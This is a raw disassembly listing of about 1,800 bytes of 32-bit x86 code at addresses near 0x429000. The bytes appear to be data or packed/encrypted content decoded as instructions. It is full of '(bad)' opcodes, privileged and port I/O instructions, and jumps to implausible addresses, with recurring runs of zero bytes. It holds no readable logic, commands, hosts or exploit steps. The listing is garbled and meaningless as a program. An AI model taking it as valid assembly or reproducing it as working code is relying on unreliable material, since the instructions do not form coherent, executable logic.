  428e89:	xchg   BYTE PTR [ebp+0x10],ah
  428e8c:	dec    esp
  428e8d:	xchg   BYTE PTR [ebp-0xc],bh
  428e90:	dec    esp
  428e91:	dec    ebp
  428e92:	sub    DWORD PTR [ebx-0x3bae221],ecx
  428e98:	lahf   
  428e99:	leave  
  428e9a:	add    BYTE PTR [esi+0x0],dh
  428e9d:	add    BYTE PTR [eax],al
  428e9f:	add    BYTE PTR [eax],al
  428ea1:	cmp    cl,bl
  428ea3:	stos   DWORD PTR es:[edi],eax
  428ea4:	inc    BYTE PTR [ebx]
  428ea6:	retf   0xc882
  428ea9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428eaa:	add    BYTE PTR [ecx],al
  428eac:	add    BYTE PTR [esi+eiz*8],bl
  428eaf:	(bad)  
  428eb0:	cmp    eax,esp
  428eb2:	dec    ebx
  428eb3:	or     eax,0x653a518b
  428eb8:	and    BYTE PTR [eax+eiz*1-0x484afb78],al
  428ebf:	pop    esp
  428ec0:	cld    
  428ec1:	inc    ebp
  428ec2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428ec3:	(bad)  
  428ec4:	push   DWORD PTR [ebp+0x2b]
  428ec7:	push   ecx
  428ec8:	inc    ebp
  428ec9:	jge    0x428ed6
  428ecb:	shr    BYTE PTR [esi],1
  428ecd:	lock (bad) 
  428ed0:	add    ebx,ecx
  428ed2:	idiv   DWORD PTR gs:[edi+0x41]
  428ed6:	add    bl,BYTE PTR [eax+edi*2-0x4d]
  428eda:	jmp    0x428f23
  428edc:	data16 jo 0x428f37
  428edf:	xor    eax,0x7a19aa59
  428ee4:	into   
  428ee5:	and    BYTE PTR [edx],dh
  428ee7:	mov    ch,0x65
  428ee9:	jl     0x428f5e
  428eeb:	push   edi
  428eec:	mov    esi,0x8748038b
  428ef1:	xor    BYTE PTR [edi],ch
  428ef3:	clc    
  428ef4:	mov    cl,0xb5
  428ef6:	mov    WORD PTR [eax+eax*8+0x47683a5],es
  428efd:	int3   
  428efe:	push   eax
  428eff:	fild   WORD PTR [esi+0x747639b8]
  428f05:	add    BYTE PTR [eax],al
  428f07:	add    BYTE PTR [eax],al
  428f09:	add    al,dh
  428f0b:	inc    ebp
  428f0c:	ja     0x428f53
  428f0e:	sbb    esi,0x69865807
  428f14:	test   edx,edi
  428f16:	pop    ebp
  428f17:	std    
  428f18:	ret    
  428f19:	jmp    FWORD PTR [ebx-0x22]
  428f1c:	inc    ebx
  428f1d:	data16 jne 0x428f01
  428f20:	jle    0x428f02
  428f22:	jnp    0x428ecc
  428f24:	inc    ebx
  428f25:	add    eax,0xfb41ae0d
  428f2a:	sbb    bl,BYTE PTR [ecx+eax*8-0xcfc8bf9]
  428f31:	mov    ecx,0x88dd7971
  428f36:	jp     0x428f6e
  428f38:	sbb    esi,edx
  428f3a:	mov    al,0x21
  428f3c:	add    DWORD PTR [edx+eax*4-0x5a],esi
  428f40:	es je  0x428fc1
  428f43:	add    ch,BYTE PTR [esi-0x3f]
  428f46:	outs   dx,BYTE PTR ds:[esi]
  428f47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428f48:	gs enter 0x3c42,0x9
  428f4d:	sar    BYTE PTR [edi+0x34],1
  428f50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428f51:	sti    
  428f52:	jb     0x428f0a
  428f54:	xlat   BYTE PTR ds:[ebx]
  428f55:	pop    ebx
  428f56:	jne    0x428f94
  428f58:	cmp    al,BYTE PTR [edi+0xd]
  428f5b:	add    bh,BYTE PTR [ebp+0x2a22eafb]
  428f61:	add    al,0x75
  428f63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428f64:	out    0xfe,eax
  428f66:	sti    
  428f67:	mov    ch,0x20
  428f69:	ret    
  428f6a:	lahf   
  428f6b:	(bad)  
  428f6e:	add    BYTE PTR [eax],al
  428f70:	add    BYTE PTR [eax],al
  428f72:	add    BYTE PTR [edi-0x70ab98f5],ch
  428f78:	cmp    eax,DWORD PTR [edx]
  428f7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428f7b:	test   ch,al
  428f7d:	lock repz and esi,DWORD PTR [esi-0x49987f31]
  428f85:	sar    DWORD PTR [edx-0x50],cl
  428f88:	push   cs
  428f89:	je     0x428f42
  428f8b:	sar    BYTE PTR [ebx+eax*2],cl
  428f8e:	sbb    DWORD PTR [edx+eiz*8+0x29d3fb5b],0xffffffe7
  428f96:	mov    ch,0xc1
  428f98:	ss into 
  428f9a:	add    bh,dl
  428f9c:	(bad)  
  428f9d:	in     al,dx
  428f9e:	adc    ch,BYTE PTR [esp+esi*1]
  428fa1:	sub    al,0xfc
  428fa3:	je     0x428f49
  428fa5:	pop    edi
  428fa6:	neg    DWORD PTR [edx-0x18090a4a]
  428fac:	or     DWORD PTR [esi+0x4c],esp
  428faf:	xchg   esp,eax
  428fb0:	mov    al,0xdd
  428fb2:	or     BYTE PTR [eax+edi*4],0x11
  428fb6:	dec    BYTE PTR [ebx-0x122276bf]
  428fbc:	or     DWORD PTR [esi+0x3d],ebp
  428fbf:	lahf   
  428fc0:	dec    ecx
  428fc1:	add    BYTE PTR [ebx+0x62543aea],ch
  428fc7:	inc    edx
  428fc8:	sub    esp,0x274f1
  428fce:	ins    BYTE PTR es:[edi],dx
  428fcf:	cmc    
  428fd0:	cmp    ebp,edi
  428fd2:	push   esi
  428fd3:	cmp    edx,edx
  428fd5:	imul   eax,DWORD PTR [bx+si],0x0
  428fdc:	jbe    0x428fe0
  428fde:	add    al,0xd3
  428fe0:	jbe    0x429019
  428fe2:	jne    0x428fd5
  428fe4:	pushf  
  428fe5:	(bad)  
  428fe6:	out    0x6b,eax
  428fe8:	sti    
  428fe9:	ss sti 
  428feb:	fs ss mov dh,0xe
  428fef:	xchg   ebx,eax
  428ff0:	jbe    0x428f7f
  428ff2:	test   DWORD PTR [ecx],esp
  428ff4:	sub    eax,0x3bb9fb37
  428ff9:	adc    eax,0x3ab6f868
  428ffe:	test   BYTE PTR [ecx],ch
  429000:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429001:	(bad)  
  429002:	sub    eax,0xfae21f29
  429007:	jl     0x429073
  429009:	xchg   DWORD PTR [ebp-0x4c24d0f],eax
  42900f:	push   ecx
  429010:	stc    
  429011:	add    al,BYTE PTR [eax]
  429013:	jmp    0x29be6656
  429018:	jns    0x428fec
  42901a:	gs jmp 0xc6fd56ce
  429020:	mov    eax,0xcbeec07f
  429025:	inc    edx
  429026:	leave  
  429027:	stos   DWORD PTR es:[edi],eax
  429028:	xor    DWORD PTR [edx],edi
  42902a:	push   esp
  42902b:	(bad)  
  42902c:	int    0x87
  42902e:	inc    ebp
  42902f:	cmc    
  429030:	out    0x3c,al
  429032:	jne    0x429021
  429034:	mov    cl,0xcf
  429036:	pop    es
  429037:	ins    BYTE PTR es:[edi],dx
  429038:	mov    ecx,0xb0365bae
  42903d:	scas   eax,DWORD PTR es:[edi]
  42903e:	or     eax,DWORD PTR [eax]
  429040:	add    BYTE PTR [eax],al
  429042:	add    BYTE PTR [eax],al
  429044:	add    ah,ah
  429046:	or     BYTE PTR [ecx-0x8448401],cl
  42904c:	test   DWORD PTR [ebx+0x52],ebp
  42904f:	cmp    bh,bh
  429051:	loope  0x429088
  429053:	div    BYTE PTR [edi]
  429055:	pop    ebx
  429056:	sub    DWORD PTR [ebx+0x10],esp
  429059:	or     al,0x6
  42905b:	test   eax,eax
  42905d:	mov    al,0xf
  42905f:	dec    esi
  429060:	jmp    DWORD PTR [ecx-0x378a7dd7]
  429066:	mov    al,0x44
  429068:	or     BYTE PTR [ebp+eax*1+0x759c4078],ah
  42906f:	jecxz  0x428ffd
  429071:	sar    DWORD PTR [edi+0x3a5083f6],cl
  429077:	test   al,al
  429079:	cli    
  42907a:	xor    al,0xf6
  42907c:	jne    0x429012
  42907e:	jcxz   0x4290b8
  429081:	in     al,dx
  429082:	mov    esi,0x3d01fff6
  429087:	jecxz  0x429020
  429089:	mov    edi,0x135ef6bf
  42908e:	fisttp QWORD PTR [edi-0x941a5cd]
  429094:	jne    0x4290fe
  429096:	mov    esi,0x455f0c14
  42909b:	sti    
  42909c:	pop    esi
  42909d:	mov    esp,eax
  42909f:	sldt   WORD PTR [ecx+0x2883ebbb]
  4290a6:	push   ecx
  4290a7:	push   ecx
  4290a8:	lea    eax,[eax]
  4290aa:	add    BYTE PTR [eax],al
  4290ac:	add    BYTE PTR [eax],al
  4290ae:	xor    DWORD PTR [edx+0x51cb8b7],0x335be800
  4290b8:	sti    
  4290b9:	jmp    DWORD PTR [edi+0x21ff4ff7]
  4290bf:	ins    DWORD PTR es:[edi],dx
  4290c0:	adc    BYTE PTR [eax+0x75],al
  4290c3:	sub    esi,DWORD PTR [esi+0x45]
  4290c6:	or     DWORD PTR [esi+0x63f90b3e],ebx
  4290cc:	(bad)  
  4290cd:	push   DWORD PTR [ebp+0x1c]
  4290d0:	lods   eax,DWORD PTR ds:[esi]
  4290d1:	mov    WORD PTR [eax-0x5],?
  4290d4:	xchg   BYTE PTR [ecx-0x1800d48b],bh
  4290da:	fwait
  4290db:	cmp    al,0xff
  4290dd:	(bad)  
  4290de:	out    dx,al
  4290df:	or     eax,0x2b350e44
  4290e4:	js     0x4290a9
  4290e6:	and    eax,0xc2fbc9c8
  4290eb:	sbb    BYTE PTR [eax-0x28],bh
  4290ee:	call   0xeffab468
  4290f3:	sub    bh,bh
  4290f5:	call   FWORD PTR [ebp-0x5d000fdf]
  4290fb:	mov    bl,0x3b
  4290fd:	push   eax
  4290fe:	call   0xb9a1:0xabfb438d
  429105:	out    dx,eax
  429106:	clc    
  429107:	test   DWORD PTR [edi],esi
  429109:	mov    eax,0xffff2abe
  42910e:	lea    edi,[ecx]
  429110:	lock inc DWORD PTR [eax]
  429113:	add    BYTE PTR [eax],al
  429115:	add    BYTE PTR [eax],al
  429117:	jb     0x4290be
  429119:	cmp    edx,DWORD PTR [eax+0x6a]
  42911c:	scas   eax,DWORD PTR es:[edi]
  42911d:	inc    edx
  42911e:	sti    
  42911f:	dec    ebx
  429120:	sbb    eax,0xe55d8736
  429125:	pop    ebp
  429126:	je     0x4290f9
  429128:	adc    bh,BYTE PTR [ecx-0x52f3e11]
  42912e:	stc    
  42912f:	leave  
  429130:	cld    
  429131:	stos   DWORD PTR es:[edi],eax
  429132:	xor    edi,DWORD PTR [ecx+0x5ee803e9]
  429138:	mov    esi,0x4f2afb3e
  42913d:	jae    0x429150
  42913f:	mov    ch,0x2
  429141:	jmp    0x666941d2
  429146:	cmp    al,0xe
  429148:	scas   eax,DWORD PTR es:[edi]
  429149:	jecxz  0x42918d
  42914b:	add    BYTE PTR [esi],0x8a
  42914e:	mov    ecx,0x2c19d27a
  429153:	adc    BYTE PTR [ecx],bh
  429155:	jp     0x42919a
  429157:	add    BYTE PTR [esi-0x42062b90],bh
  42915d:	je     0x429133
  42915f:	pop    eax
  429160:	add    DWORD PTR [ebx+0x6453dfd9],edi
  429166:	inc    esp
  429167:	dec    ecx
  429168:	not    BYTE PTR ds:0x50ad8c5f
  42916e:	mov    edx,0x37ac8b8f
  429173:	call   0x34d1747e
  429178:	or     ch,BYTE PTR [esp+eax*2+0x0]
  42917c:	add    BYTE PTR [eax],al
  42917e:	add    BYTE PTR [eax],al
  429180:	and    ebp,edi
  429182:	gs cmp al,0x79
  429185:	lods   eax,DWORD PTR ds:[esi]
  429186:	cld    
  429187:	mov    ?,WORD PTR [ebx+edi*8-0x5d]
  42918b:	das    
  42918c:	or     DWORD PTR ds:0x377eb912,eax
  429192:	xchg   esp,eax
  429193:	or     esp,DWORD PTR ds:0x7f6a10cf
  429199:	aaa    
  42919a:	cli    
  42919b:	(bad)  
  42919c:	repz inc eax
  42919e:	in     eax,0xfe
  4291a0:	leave  
  4291a1:	cmp    dh,BYTE PTR [edi+0x54]
  4291a4:	pop    esi
  4291a5:	lods   eax,DWORD PTR ds:[esi]
  4291a6:	fadd   QWORD PTR [edx-0x40]
  4291a9:	xor    bl,dl
  4291ab:	mov    eax,0xdffc374e
  4291b0:	js     0x429174
  4291b2:	call   0xb01b3d99
  4291b7:	inc    ebp
  4291b8:	ins    DWORD PTR es:[edi],dx
  4291b9:	add    dh,ch
  4291bb:	scas   eax,DWORD PTR es:[edi]
  4291bc:	in     al,0xcc
  4291be:	jmp    FWORD PTR [ebx+0x57]
  4291c1:	dec    edi
  4291c2:	ss hlt 
  4291c4:	pop    ebx
  4291c5:	rcl    cl,1
  4291c7:	(bad)  [ecx-0x4423a8fb]
  4291cd:	rcr    BYTE PTR [edx-0x3c],0xb3
  4291d1:	clc    
  4291d2:	cmp    DWORD PTR [ebx+edi*8],ebp
  4291d5:	pop    esp
  4291d6:	sub    DWORD PTR [edi+ecx*1-0x21e52f17],ecx
  4291dd:	(bad)  [bx+di]
  4291e0:	sahf   
  4291e1:	rcl    BYTE PTR [esi-0x2c],1
  4291e4:	add    BYTE PTR [eax],al
  4291e6:	add    BYTE PTR [eax],al
  4291e8:	add    BYTE PTR [ebx],bh
  4291ea:	adc    BYTE PTR [edx+0x3e],ch
  4291ed:	(bad)  
  4291ee:	rcl    cl,1
  4291f0:	xchg   BYTE PTR [ebx-0x44],bl
  4291f3:	fmul   st,st(0)
  4291f5:	addr16 inc ebx
  4291f8:	enter  0x538f,0x4e
  4291fc:	lods   al,BYTE PTR ds:[esi]
  4291fd:	neg    ecx
  4291ff:	ror    eax,1
  429201:	das    
  429202:	and    DWORD PTR [edx-0x7b],ebp
  429205:	adc    dl,al
  429207:	test   BYTE PTR [eax+0x75],ah
  42920a:	arpl   WORD PTR [ecx],bp
  42920c:	xchg   ebx,edx
  42920e:	mov    ecx,ds
  429210:	add    al,0x90
  429212:	int3   
  429213:	ror    DWORD PTR [eax-0x6311e728],1
  429219:	call   DWORD PTR [eax+0x10]
  42921c:	mov    eax,0x5f375e67
  429221:	mov    ds,WORD PTR [eax+0x12]
  429224:	xchg   DWORD PTR [ebx],edx
  429226:	mov    dl,dl
  429228:	mov    BYTE PTR [edi-0x67d351a5],cl
  42922e:	int3   
  42922f:	in     al,0x88
  429231:	and    esp,esp
  429233:	in     eax,dx
  429234:	sub    ch,cl
  429236:	xor    ebp,DWORD PTR [ecx]
  429238:	push   ebp
  429239:	cld    
  42923a:	mov    ebp,0x16ad0091
  42923f:	es repnz ins DWORD PTR es:[edi],dx
  429242:	fs loope 0x4291d7
  429245:	and    ebx,ebp
  429247:	push   ecx
  429248:	(bad)  
  429249:	loopne 0x4291da
  42924b:	jbe    0x429207
  42924d:	add    BYTE PTR [eax],al
  42924f:	add    BYTE PTR [eax],al
  429251:	add    BYTE PTR [eax+ebx*4],al
  429254:	jbe    0x429224
  429256:	test   DWORD PTR [ebp-0x4a],edx
  429259:	sub    BYTE PTR [edx+0x6dd6d293],al
  42925f:	jmp    0x42922f
  429261:	xchg   edx,eax
  429262:	dec    ecx
  429263:	retf   
  429264:	add    DWORD PTR [ecx+0x78aa1a06],eax
  42926a:	push   ebp
  42926b:	sbb    DWORD PTR [ebp+0x6dbeb95b],esp
  429271:	xchg   BYTE PTR [esi+0x21],al
  429274:	lods   eax,DWORD PTR ds:[esi]
  429275:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429276:	inc    esp
  429277:	sbb    DWORD PTR [ebp-0x564404a3],esp
  42927d:	daa    
  42927e:	inc    ebp
  42927f:	push   ss
  429280:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429281:	pop    ebp
  429282:	jmp    0x42923f
  429284:	test   eax,0xa519259d
  429289:	mov    esp,0xf2d967bd
  42928e:	xchg   ecx,eax
  42928f:	fcom   QWORD PTR [ecx-0x2a]
  429292:	mov    ebp,0x5869765
  429297:	mov    edi,0x59022861
  42929c:	scas   eax,DWORD PTR es:[edi]
  42929d:	xlat   BYTE PTR ds:[ebx]
  42929e:	in     eax,dx
  42929f:	jmp    0x92ce:0xb39916d5
  4292a6:	sbb    DWORD PTR [esi+0x11d58501],edi
  4292ac:	pop    ds
  4292ad:	(bad)  
  4292ae:	in     eax,dx
  4292af:	pop    ebp
  4292b0:	xchg   ebp,eax
  4292b1:	mov    ds:0xf21964c2,al
  4292b6:	add    BYTE PTR [eax],al
  4292b8:	add    BYTE PTR [eax],al
  4292ba:	add    BYTE PTR [ecx+0x75a2a4bb],bl
  4292c0:	out    0x40,al
  4292c2:	or     DWORD PTR [ebx-0x735b2a5c],eax
  4292c8:	xor    al,0xad
  4292ca:	sbb    DWORD PTR [edi],esp
  4292cc:	es js  0x4292fd
  4292cf:	arpl   WORD PTR [ebx-0x10b3a99e],di
  4292d5:	pop    esp
  4292d6:	dec    esp
  4292d7:	add    ecx,DWORD PTR [edx]
  4292d9:	test   al,0x99
  4292db:	das    
  4292dc:	xchg   DWORD PTR [ecx+edi*2+0x562907fb],esp
  4292e3:	sti    
  4292e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4292e5:	xchg   ebx,eax
  4292e6:	jp     0x429317
  4292e8:	popf   
  4292e9:	xor    al,0xd6
  4292eb:	mov    ecx,0x79c2849
  4292f0:	out    0x2b,al
  4292f2:	push   edi
  4292f3:	ds ds inc esp
  4292f6:	test   DWORD PTR cs:[edx+0x28],ecx
  4292fa:	push   ss
  4292fb:	in     eax,dx
  4292fc:	cs and eax,edx
  4292ff:	out    0x65,eax
  429301:	daa    
  429302:	add    eax,0xbab010ed
  429307:	out    dx,al
  429308:	out    0xd1,eax
  42930a:	xchg   BYTE PTR [ecx+0x71242aa9],ah
  429310:	sub    edi,edi
  429312:	push   ecx
  429313:	dec    edx
  429314:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429315:	xor    BYTE PTR [ecx],al
  429317:	jne    0x429344
  429319:	fdivr  st,st(2)
  42931b:	or     BYTE PTR [ebx],dh
  42931d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42931e:	fild   WORD PTR [eax]
  429320:	add    BYTE PTR [eax],al
  429322:	add    BYTE PTR [eax],al
  429324:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429325:	addr16 (bad) 
  429327:	cli    
  429328:	push   0x75401947
  42932d:	test   al,0x42
  42932f:	or     al,0x0
  429331:	out    dx,eax
  429332:	and    bh,ch
  429334:	push   0x2d
  429336:	es enter 0x2459,0x3b
  42933b:	test   WORD PTR [edx],ax
  42933e:	je     0x4292c9
  429340:	fnstenv [edx+ebx*8]
  429343:	aas    
  429344:	or     al,0x53
  429346:	mov    eax,0xa61c42c3
  42934b:	cmc    
  42934c:	cmp    al,0x34
  42934e:	ins    BYTE PTR es:[edi],dx
  42934f:	inc    esp
  429350:	test   eax,0x37466e05
  429355:	add    ebp,ecx
  429357:	ret    
  429358:	scas   eax,DWORD PTR es:[edi]
  429359:	lods   eax,DWORD PTR ds:[esi]
  42935a:	scas   eax,DWORD PTR es:[edi]
  42935b:	repnz fisub DWORD PTR [edi]
  42935e:	adc    ch,BYTE PTR [edx-0x499b7a9a]
  429364:	sysenter 
  429366:	xchg   edx,eax
  429367:	aam    0x98
  429369:	add    bl,BYTE PTR [ecx+edi*4+0x26]
  42936d:	xor    BYTE PTR [ecx-0x407422c1],0x3d
  429374:	out    dx,al
  429375:	jge    0x429320
  429377:	mov    esi,0xd4a38781
  42937c:	push   edx
  42937d:	jp     0x4293b3
  42937f:	ret    
  429380:	rol    BYTE PTR [esi+0x33c26064],cl
  429386:	push   edx
  429387:	aam    0x0
  429389:	add    BYTE PTR [eax],al
  42938b:	add    BYTE PTR [eax],al
  42938d:	fcmove st,st(0)
  42938f:	adc    eax,0x297dbe3e
  429394:	invd   
  429396:	inc    ebx
  429397:	gs inc esp
  429399:	and    BYTE PTR [ecx],cl
  42939b:	test   BYTE PTR [ebx+0x17],0x89
  42939f:	fs pusha 
  4293a1:	mov    ds:0x483f2233,al
  4293a6:	outs   dx,BYTE PTR ds:[esi]
  4293a7:	sub    al,0xc3
  4293a9:	mov    al,BYTE PTR [esi+0x338a606c]
  4293af:	or     dl,ah
  4293b1:	jg     0x4293c0
  4293b3:	rcl    DWORD PTR [esi*4-0x7bb9bfe],1
  4293ba:	jl     0x4293bc
  4293bc:	or     eax,0x75fb37b4
  4293c1:	imul   eax,DWORD PTR [eax+0x0],0x74c836e9
  4293c8:	loopne 0x429369
  4293ca:	nop
  4293cb:	ret    0x76e9
  4293ce:	ret    0x544a
  4293d1:	js     0x429445
  4293d3:	add    DWORD PTR [esi],esp
  4293d5:	push   ebx
  4293d6:	dec    edx
  4293d7:	mov    esi,0x86cd76e5
  4293dc:	(bad)  
  4293df:	je     0x4293c8
  4293e1:	jbe    0x4293e5
  4293e3:	dec    edi
  4293e4:	aas    
  4293e5:	push   es
  4293e6:	dec    esp
  4293e7:	push   ebx
  4293e8:	ins    BYTE PTR es:[edi],dx
  4293e9:	int    0x46
  4293eb:	mov    eax,0x27655
  4293f0:	popa   
  4293f1:	add    BYTE PTR [eax],al
  4293f3:	add    BYTE PTR [eax],al
  4293f5:	add    BYTE PTR ds:0x8912e838,dl
  4293fb:	add    al,BYTE PTR [eax]
  4293fd:	jb     0x42942f
  4293ff:	sar    dl,cl
  429401:	fdivr  QWORD PTR [esi-0x1616bfef]
  429407:	mov    esp,0x73622f3
  42940c:	test   BYTE PTR [ebx+0x64000276],cl
  429412:	mov    ch,0x66
  429414:	mov    eax,0x2768c
  429419:	push   ecx
  42941a:	mov    dl,BYTE PTR [edx]
  42941c:	add    cl,ch
  42941e:	(bad)  
  42941f:	ds push eax
  429421:	(bad)  ss:[esi]
  429424:	sti    
  429425:	aam    0x36
  429427:	add    al,0x40
  429429:	jmp    0x96b707bd
  42942e:	in     eax,0xc4
  429430:	idiv   DWORD PTR [eax+0xca084e5]
  429436:	cmp    esi,DWORD PTR [edi]
  429438:	push   ecx
  429439:	add    BYTE PTR [ebx+0x5d04f33a],ah
  42943f:	push   es
  429440:	add    bh,bh
  429442:	jl     0x4293c8
  429444:	clc    
  429445:	add    ecx,esp
  429447:	dec    edi
  429448:	mov    WORD PTR [ebp-0x9140c],es
  42944e:	mov    WORD PTR [eax+eax*1+0x6a],ds
  429452:	sub    ebx,DWORD PTR [ebp-0x2]
  429455:	push   edx
  429456:	sub    ebx,DWORD PTR [edx]
  429458:	pop    eax
  429459:	adc    eax,DWORD PTR [eax]
  42945b:	add    BYTE PTR [eax],al
  42945d:	add    BYTE PTR [eax],al
  42945f:	pop    esp
  429460:	push   es
  429461:	test   eax,eax
  429463:	popa   
  429464:	dec    eax
  429465:	mov    WORD PTR [ebp-0x90e14],es
  42946b:	jl     0x42945c
  42946d:	adc    al,0x90
  42946f:	push   cs
  429470:	inc    esi
  429471:	sti    
  429472:	dec    edi
  429473:	test   DWORD PTR [ecx-0xd],ecx
  429476:	lea    edx,[ecx-0x14000c72]
  42947c:	push   esi
  42947d:	mov    WORD PTR [ebp-0x90ec4],es
  429483:	mov    edi,gs
  429485:	adc    al,0x6c
  429487:	mov    edi,0xc84fb45
  42948c:	jp     0x4294aa
  42948e:	mov    esp,DWORD PTR [ecx]
  429490:	out    dx,al
  429491:	mov    WORD PTR [ecx+edx*1+0x2bfff38e],es
  429498:	push   esi
  429499:	jp     0x429463
  42949b:	sub    eax,DWORD PTR [ecx-0x10c8674b]
  4294a1:	imul   al
  4294a3:	shr    BYTE PTR [edx],0xf9
  4294a6:	call   DWORD PTR [edx+0x49]
  4294a9:	test   BYTE PTR [ecx],0x4b
  4294ac:	jns    0x42949d
  4294ae:	call   DWORD PTR [ecx-0x63bff2af]
  4294b4:	sub    eax,0x8e75ff5c
  4294b9:	add    al,0x2e
  4294bb:	mov    ch,0x2
  4294bd:	scas   al,BYTE PTR es:[edi]
  4294be:	add    BYTE PTR [ebp+0x1b],dh
  4294c1:	xchg   DWORD PTR [ebp+0x0],ebx
  4294c4:	add    BYTE PTR [eax],al
  4294c6:	add    BYTE PTR [eax],al
  4294c8:	push   0xffffffb2
  4294ca:	(bad)  
  4294cc:	and    cl,BYTE PTR [edi-0x318ac045]
  4294d2:	ret    0xa5e7
  4294d5:	mov    dh,0xc1
  4294d7:	jecxz  0x42947e
  4294d9:	sahf   
  4294da:	shr    edi,0xa5
  4294dd:	lds    edi,FWORD PTR [ecx*4+0x65cf53b0]
  4294e4:	ja     0x4294f2
  4294e6:	ror    DWORD PTR [eax+0x153c43c8],1
  4294ec:	push   ecx
  4294ed:	dec    esp
  4294ee:	mov    edi,0x2fe5edff
  4294f3:	aaa    
  4294f4:	ss wbinvd 
  4294f7:	cmp    eax,0xffff1b1f
  4294fc:	jb     0x42949c
  4294fe:	and    al,BYTE PTR [eax]
  429500:	jne    0x42951d
  429502:	neg    BYTE PTR [ebp+ebp*8+0x37]
  429506:	or     edx,0x75
  429509:	sbb    edi,edi
  42950b:	cs jmp 0x42957f
  42950e:	(bad)  
  429510:	push   0xffffffa9
  429512:	js     0x429514
  429514:	jne    0x429531
  429516:	mov    al,BYTE PTR [ebp-0x3f]
  429519:	push   0xffffff88
  42951b:	inc    ebp
  42951c:	mov    ebp,0x81fb1444
  429521:	mov    edx,eax
  429523:	cli    
  429524:	mov    BYTE PTR [edi],ch
  429526:	adc    BYTE PTR [eax+0x75],al
  429529:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42952a:	or     eax,DWORD PTR ds:[eax]
  42952d:	add    BYTE PTR [eax],al
  42952f:	add    BYTE PTR [eax],al
  429531:	clc    
  429532:	int    0xfe
  429534:	push   DWORD PTR [ebp-0x5c]
  429537:	shl    ebx,0x4e
  42953a:	add    ah,BYTE PTR [esi]
  42953c:	or     al,0xf1
  42953e:	jnp    0x429529
  429540:	add    esi,DWORD PTR [ebp+0x7f]
  429543:	arpl   WORD PTR fs:[eax+0x30],di
  429547:	or     dl,dl
  429549:	outs   dx,DWORD PTR ds:[esi]
  42954a:	mov    bl,0xd8
  42954c:	sub    eax,DWORD PTR [esi-0x6c40602]
  429552:	inc    edx
  429553:	jge    0x429502
  429555:	jmp    0x4e7ae6df
  42955a:	xor    BYTE PTR [ecx],bh
  42955c:	mov    eax,esi
  42955e:	(bad)  
  42955f:	fdivr  QWORD PTR [ebx]
  429561:	sar    DWORD PTR ds:[eax],cl
  429564:	sub    al,0xf2
  429566:	icebp  
  429567:	retf   0xf83b
  42956a:	inc    edx
  42956b:	cmp    eax,0x8985f9d2
  429570:	cmp    DWORD PTR [esi],ebx
  429572:	xor    BYTE PTR [ecx],bl
  429574:	sub    al,0x6b
  429576:	sub    DWORD PTR [edx+0x1d42f93b],0x7985f9c2
  429580:	cmp    eax,0xac392ffe
  429585:	jp     0x429589
  429587:	jmp    0x6cbfdd8b
  42958c:	fs call 0x34170fc1
  429592:	sbb    al,bh
  429594:	jge    0x429596
  429596:	add    BYTE PTR [eax],al
  429598:	add    BYTE PTR [eax],al
  42959a:	fisubr WORD PTR [edi]
  42959c:	fs inc esp
  42959e:	dec    ecx
  42959f:	fidiv  DWORD PTR [ebp+0x6092f088]
  4295a5:	cmp    edi,DWORD PTR [esi+0x7e2bb5d2]
  4295ab:	fisttp QWORD PTR [edx+0x3b]
  4295ae:	stc    
  4295af:	inc    edx
  4295b0:	mov    ebp,0x5985f811
  4295b5:	cmp    eax,0x99002f9e
  4295ba:	jmp    0x429581
  4295bc:	repz cs leave 
  4295bf:	inc    ecx
  4295c1:	lods   al,BYTE PTR ds:[esi]
  4295c2:	dec    edi
  4295c3:	add    eax,ebp
  4295c5:	lds    eax,FWORD PTR [ebx+0x2b]
  4295c8:	sti    
  4295c9:	push   ss
  4295ca:	les    esi,FWORD PTR [ebx]
  4295cc:	sti    
  4295cd:	hlt    
  4295ce:	data16 add BYTE PTR [eax-0x17],al
  4295d2:	xor    al,0xf8
  4295d4:	je     0x4295cf
  4295d6:	outs   dx,DWORD PTR ds:[esi]
  4295d7:	mov    al,0x41
  4295d9:	neg    BYTE PTR [edi-0x718b04d5]
  4295df:	sub    edx,DWORD PTR ds:0xffc26219
  4295e5:	addr16 std 
  4295e7:	sbb    ah,dh
  4295e9:	jmp    0x654d9864
  4295ee:	arpl   WORD PTR [ebx+edi*8],bp
  4295f1:	(bad)  
  4295f2:	std    
  4295f3:	test   BYTE PTR [eax+0x502b5fc2],bl
  4295f9:	inc    ebx
  4295fa:	jo     0x4295a4
  4295fc:	cli    
  4295fd:	inc    ecx
  4295fe:	add    BYTE PTR [eax],al
  429600:	add    BYTE PTR [eax],al
  429602:	add    BYTE PTR [esi-0x7e],dh
  429605:	add    cl,ch
  429607:	and    ebp,DWORD PTR [edx*1-0x3d95bf]
  42960e:	imul   esi,DWORD PTR [esi-0xaa3cc4b],0xffffff91
  429615:	stc    
  429616:	xchg   BYTE PTR [edi+0x766967d2],ch
  42961c:	add    al,BYTE PTR [esi+ebx*1]
  42961f:	in     al,dx
  429620:	test   BYTE PTR [eax+0x502b8f72],bl
  429626:	mov    edx,0x5eb98a9e
  42962b:	jg     0x4295b2
  42962d:	rcr    ch,0x64
  429630:	mov    edi,0x2906648c
  429635:	sti    
  429636:	add    BYTE PTR [ebx],dh
  429638:	push   ebx
  429639:	dec    edx
  42963a:	call   0x3bbd68
  42963f:	or     bl,al
  429641:	jae    0x429647
  429643:	pop    edx
  429644:	inc    edx
  429645:	test   BYTE PTR [ecx],0x6
  429648:	inc    edx
  429649:	neg    BYTE PTR [edi-0x3e]
  42964c:	dec    edi
  42964d:	enter  0xb9c3,0x7f
  429651:	in     al,dx
  429652:	xor    DWORD PTR [eax-0x53],0x555c0006
  429659:	push   ecx
  42965a:	push   edi
  42965b:	shl    DWORD PTR [edx-0x139c0901],1
  429661:	out    0xc7,eax
